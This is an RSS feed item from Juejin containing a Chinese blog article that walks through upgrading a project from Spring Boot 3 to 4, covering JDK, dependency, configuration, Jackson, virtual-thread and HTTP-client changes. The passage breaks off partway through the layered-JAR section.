<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[从 Spring Boot 3 升级到 4：完整迁移指南]]></title>    <link>https://juejin.cn/post/7575751471842525220</link>    <guid>https://juejin.cn/post/7575751471842525220</guid>    <pubDate>2025-11-24T04:31:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471842525220" data-draft-id="7575751471842508836" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 Spring Boot 3 升级到 4：完整迁移指南"/> <meta itemprop="keywords" content="后端,Spring Boot"/> <meta itemprop="datePublished" content="2025-11-24T04:31:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="架构师专栏"/> <meta itemprop="url" content="https://juejin.cn/user/2682464101221998"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 Spring Boot 3 升级到 4：完整迁移指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2682464101221998/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    架构师专栏
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:31:55.000Z" title="Mon Nov 24 2025 04:31:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>兄弟们，鹏磊今天来聊聊从 Spring Boot 3 升级到 4 这事儿；说实话，这升级过程比想象中要复杂点，但也没那么吓人，只要按步骤来，基本都能搞定。别慌，慢慢来就行。</p>
<h2 data-id="heading-0">一、升级前准备</h2>
<p>升级之前，咱得先搞清楚几个事儿；别一上来就改代码，那样容易出问题。这事儿急不得，得一步步来。</p>
<h3 data-id="heading-1">1. 检查当前环境</h3>
<p>首先，你得知道你现在用的是啥版本；打开 <code>pom.xml</code> 或者 <code>build.gradle</code>，看看 Spring Boot 版本号。如果是 3.x 系列的，那就可以开始升级了；如果是 2.x 或者更老的版本，建议先升级到 3.x，再考虑升级到 4。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 这是升级前的 pom.xml，看看你的版本是不是 3.x --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 这是你当前的版本，记下来 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>
</code></pre>
<h3 data-id="heading-2">2. JDK 版本要求</h3>
<p>这个最重要，Spring Boot 4 要求最低 JDK 17，推荐用 JDK 21；你要是还在用 JDK 8 或者 JDK 11，那对不起，得先升级 JDK。这事儿没商量，不升级 JDK 就别想用 Spring Boot 4。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查一下你的 JDK 版本</span>
java -version

<span class="hljs-comment"># 如果版本低于 17，得先升级 JDK</span>
<span class="hljs-comment"># 推荐用 JDK 21，性能好，虚拟线程支持也完整</span>
</code></pre>
<h3 data-id="heading-3">3. 备份代码</h3>
<p>升级之前，一定要备份代码；别嫌麻烦，万一出问题，还能回滚。用 Git 的话，先提交一下，或者创建一个新分支专门用来升级。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建升级分支</span>
git checkout -b upgrade-to-spring-boot-4

<span class="hljs-comment"># 提交当前代码</span>
git add .
git commit -m <span class="hljs-string">"准备升级到 Spring Boot 4"</span>
</code></pre>
<h2 data-id="heading-4">二、依赖升级</h2>
<h3 data-id="heading-5">1. 更新 Spring Boot 版本</h3>
<p>第一步，先把 Spring Boot 版本改成 4.0.0；Maven 和 Gradle 的配置不一样，咱分别说说。</p>
<p><strong>Maven 配置：</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 升级后的 pom.xml，版本改成 4.0.0 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 改成 4.0.0，这是最新版本 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>21<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span>  <span class="hljs-comment">&lt;!-- JDK 版本改成 21，推荐用这个 --&gt;</span>
    <span class="hljs-comment">&lt;!-- 或者用 17，最低要求 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>
</code></pre>
<p><strong>Gradle 配置：</strong></p>
<pre><code class="hljs language-groovy" lang="groovy">// build.gradle 配置
plugins {
    id 'org.springframework.boot' version '4.0.0'  // 版本改成 4.0.0
    id 'io.spring.dependency-management' version '1.1.4'
}

java {
    sourceCompatibility = '21'  // JDK 版本改成 21
    targetCompatibility = '21'
}
</code></pre>
<h3 data-id="heading-6">2. 添加属性迁移工具</h3>
<p>升级过程中，有些配置属性可能会被废弃或者改名；Spring Boot 提供了个工具叫 <code>spring-boot-properties-migrator</code>，能帮你检查这些废弃的属性。这玩意儿挺有用的，建议先加上。启动的时候会自动提示你哪些属性有问题。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Maven 配置，添加属性迁移工具 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-properties-migrator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>  <span class="hljs-comment">&lt;!-- runtime 作用域，只在运行时用 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-groovy" lang="groovy">// Gradle 配置
dependencies {
    runtimeOnly 'org.springframework.boot:spring-boot-properties-migrator'  // 添加这个依赖
}
</code></pre>
<p>启动应用的时候，这个工具会自动检查废弃的属性，并在日志里提示你；等升级完了，记得把这个依赖删掉，不需要了。</p>
<h3 data-id="heading-7">3. 检查第三方依赖兼容性</h3>
<p>Spring Boot 4 升级了 Spring Framework 到 7.0，很多第三方依赖可能还没适配；你得一个个检查，看看有没有兼容 Spring Boot 4 的版本。</p>
<p>常见的依赖需要检查的：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 数据库相关 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-comment">&lt;!-- MySQL 驱动，检查版本 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- Redis 相关 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-comment">&lt;!-- Redis，一般没问题 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 消息队列 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-comment">&lt;!-- RabbitMQ，检查版本 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>建议去各个依赖的官网看看，有没有发布兼容 Spring Boot 4 的版本；没有的话，可能得等一段时间，或者找替代方案。这事儿比较麻烦，但也没办法。</p>
<h2 data-id="heading-8">三、代码修改</h2>
<h3 data-id="heading-9">1. 废弃的 API 替换</h3>
<p>Spring Boot 4 废弃了一些 API，得替换掉；最常见的是 Jackson 2 相关的，Spring Boot 4 全面支持 Jackson 3 了，Jackson 2 的自动配置被标记为废弃。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 升级前，用的是 Jackson 2</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JacksonConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Jackson2ObjectMapperBuilder <span class="hljs-title function_">jackson2ObjectMapperBuilder</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 这个 API 在 Spring Boot 4 里被废弃了</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jackson2ObjectMapperBuilder</span>();
    }
}

<span class="hljs-comment">// 升级后，改用 Jackson 3</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JacksonConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> JacksonObjectMapperBuilder <span class="hljs-title function_">jacksonObjectMapperBuilder</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 改用 Jackson 3 的 API，名字变了，用法差不多</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JacksonObjectMapperBuilder</span>();
    }
}
</code></pre>
<h3 data-id="heading-10">2. 配置属性迁移</h3>
<p>有些配置属性改名了，或者被废弃了；启动应用的时候，<code>spring-boot-properties-migrator</code> 会在日志里提示你。常见的配置变化：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 升级前的配置</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/test</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>
    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>  <span class="hljs-comment"># 这个属性可能改名了</span>

<span class="hljs-comment"># 升级后，检查日志提示，可能需要改成：</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/test</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>
    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>  <span class="hljs-comment"># 或者改成新的属性名</span>
</code></pre>
<h3 data-id="heading-11">3. 虚拟线程配置</h3>
<p>Spring Boot 4 深度集成了虚拟线程，如果你用的是 JDK 21，可以启用虚拟线程；这玩意儿性能好，能支持百万级并发。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml 配置虚拟线程</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">threads:</span>
    <span class="hljs-attr">virtual:</span>
      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 启用虚拟线程，JDK 21 才支持</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 代码里使用虚拟线程执行器</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VirtualThreadConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Executor <span class="hljs-title function_">virtualThreadExecutor</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 创建虚拟线程执行器，底层用的是 Java 21 的虚拟线程</span>
        <span class="hljs-comment">// 这玩意儿比传统线程池强多了，性能提升不是一点半点</span>
        <span class="hljs-keyword">return</span> Executors.newVirtualThreadPerTaskExecutor();
    }
    
    <span class="hljs-comment">// 配置 WebMvc 使用虚拟线程</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> TomcatProtocolHandlerCustomizer&lt;?&gt; protocolHandlerVirtualThreadExecutorCustomizer() {
        <span class="hljs-comment">// 让 Tomcat 使用虚拟线程处理请求，性能提升明显</span>
        <span class="hljs-keyword">return</span> protocolHandler -&gt; {
            protocolHandler.setExecutor(Executors.newVirtualThreadPerTaskExecutor());
        };
    }
}
</code></pre>
<h3 data-id="heading-12">4. 声明式 HTTP 客户端</h3>
<p>Spring Framework 7.0 引入了声明式 HTTP 客户端，用起来比 RestTemplate 和 WebClient 简单多了；如果你之前用的是 RestTemplate，可以考虑迁移到声明式客户端。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 升级前，用的是 RestTemplate</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RestTemplate restTemplate;  <span class="hljs-comment">// 这个还能用，但推荐用新的</span>
    
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-comment">// 调用远程接口，代码比较繁琐</span>
        <span class="hljs-keyword">return</span> restTemplate.getForObject(<span class="hljs-string">"http://api.example.com/users/"</span> + id, User.class);
    }
}

<span class="hljs-comment">// 升级后，改用声明式 HTTP 客户端</span>
<span class="hljs-meta">@HttpExchange(url = "http://api.example.com")</span>  <span class="hljs-comment">// 定义基础 URL</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserClient</span> {
    
    <span class="hljs-meta">@GetExchange("/users/{id}")</span>  <span class="hljs-comment">// GET 请求，路径参数是 id</span>
    User <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span>;  <span class="hljs-comment">// 方法签名就是接口定义，不用写实现</span>
}

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserClient userClient;  <span class="hljs-comment">// 注入客户端，Spring 会自动生成代理</span>
    
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-comment">// 直接调用，代码简洁多了</span>
        <span class="hljs-keyword">return</span> userClient.getUser(id);
    }
}
</code></pre>
<h2 data-id="heading-13">四、测试和验证</h2>
<h3 data-id="heading-14">1. 编译检查</h3>
<p>升级完依赖和代码，先编译一下，看看有没有编译错误；有错误的话，一个个解决。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Maven 编译</span>
mvn clean compile

<span class="hljs-comment"># Gradle 编译</span>
./gradlew clean build
</code></pre>
<h3 data-id="heading-15">2. 启动应用</h3>
<p>编译通过后，启动应用，看看能不能正常启动；启动的时候，注意看日志，<code>spring-boot-properties-migrator</code> 会提示废弃的属性。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动应用，观察日志</span>
mvn spring-boot:run

<span class="hljs-comment"># 或者</span>
java -jar target/your-app.jar
</code></pre>
<h3 data-id="heading-16">3. 功能测试</h3>
<p>启动成功后，跑一下功能测试，看看有没有问题；特别是那些用了废弃 API 的地方，得重点测试。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 写个简单的测试，验证基本功能</span>
<span class="hljs-meta">@SpringBootTest</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoads</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 测试应用上下文能不能正常加载</span>
        <span class="hljs-comment">// 如果这个测试都过不了，说明配置有问题</span>
    }
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testUserService</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 测试业务功能，看看有没有问题</span>
        <span class="hljs-comment">// 重点测试那些改了代码的地方</span>
    }
}
</code></pre>
<h2 data-id="heading-17">五、常见问题处理</h2>
<h3 data-id="heading-18">1. 依赖冲突</h3>
<p>升级过程中，可能会遇到依赖冲突；Maven 和 Gradle 都有工具可以检查依赖冲突。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Maven 检查依赖树</span>
mvn dependency:tree

<span class="hljs-comment"># Gradle 检查依赖</span>
./gradlew dependencies
</code></pre>
<p>如果发现冲突，可以用 <code>exclusions</code> 排除冲突的依赖，或者升级到兼容的版本。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Maven 排除冲突依赖 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>some-library<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 排除这个依赖 --&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-19">2. 配置属性找不到</h3>
<p>有些配置属性可能被废弃了，但你的代码还在用；启动的时候，日志会提示你，按照提示改成新的属性名就行。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 如果日志提示某个属性被废弃了，比如：</span>
<span class="hljs-comment"># The property 'spring.datasource.driver-class-name' is deprecated</span>

<span class="hljs-comment"># 改成新的属性名，或者删除，如果不需要的话</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-comment"># driver-class-name: com.mysql.cj.jdbc.Driver  # 这个可能不需要了，自动检测</span>
</code></pre>
<h3 data-id="heading-20">3. 类找不到</h3>
<p>如果启动的时候报 <code>ClassNotFoundException</code>，可能是某个依赖没升级，或者版本不兼容；检查一下依赖版本，升级到兼容 Spring Boot 4 的版本。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 如果报错说某个类找不到，比如：</span>
<span class="hljs-comment">// java.lang.ClassNotFoundException: com.fasterxml.jackson.databind.ObjectMapper</span>

<span class="hljs-comment">// 可能是 Jackson 版本问题，Spring Boot 4 用的是 Jackson 3</span>
<span class="hljs-comment">// 检查一下依赖，确保用的是 Spring Boot 4 管理的版本</span>
</code></pre>
<h2 data-id="heading-21">六、升级流程图</h2>
<p>整个升级流程可以用下面这个图来理解：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[开始升级] --&gt; B[检查当前环境]
    B --&gt; C{JDK 版本 &gt;= 17?}
    C --&gt;|否| D[升级 JDK]
    C --&gt;|是| E[备份代码]
    D --&gt; E
    E --&gt; F[更新 Spring Boot 版本]
    F --&gt; G[添加属性迁移工具]
    G --&gt; H[检查第三方依赖]
    H --&gt; I[修改代码]
    I --&gt; J[编译检查]
    J --&gt; K{编译通过?}
    K --&gt;|否| L[修复编译错误]
    L --&gt; J
    K --&gt;|是| M[启动应用]
    M --&gt; N{启动成功?}
    N --&gt;|否| O[查看日志，修复问题]
    O --&gt; M
    N --&gt;|是| P[功能测试]
    P --&gt; Q{测试通过?}
    Q --&gt;|否| R[修复功能问题]
    R --&gt; P
    Q --&gt;|是| S[删除属性迁移工具]
    S --&gt; T[升级完成]
</code></pre>
<h2 data-id="heading-22">七、升级后的优化</h2>
<h3 data-id="heading-23">1. 启用虚拟线程</h3>
<p>如果你用的是 JDK 21，建议启用虚拟线程；这玩意儿性能好，能大幅提升并发性能。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 启用虚拟线程</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">threads:</span>
    <span class="hljs-attr">virtual:</span>
      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
</code></pre>
<h3 data-id="heading-24">2. 使用 GraalVM 原生镜像</h3>
<p>Spring Boot 4 对 GraalVM 原生镜像的支持更完善了；如果条件允许，可以尝试编译成原生镜像，启动速度快，内存占用也少。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 GraalVM 编译原生镜像</span>
mvn spring-boot:build-image

<span class="hljs-comment"># 或者用 Gradle</span>
./gradlew bootBuildImage
</code></pre>
<h3 data-id="heading-25">3. 使用分层 JAR</h3>
<p>Spring Boot 4 支持分层 JAR，可以把依赖层、资源层和业务层分开；这样构建 Docker 镜像的时候，只有业务层变化才需要重新构建，构建速度快不少。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Maven 配置分层 JAR --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
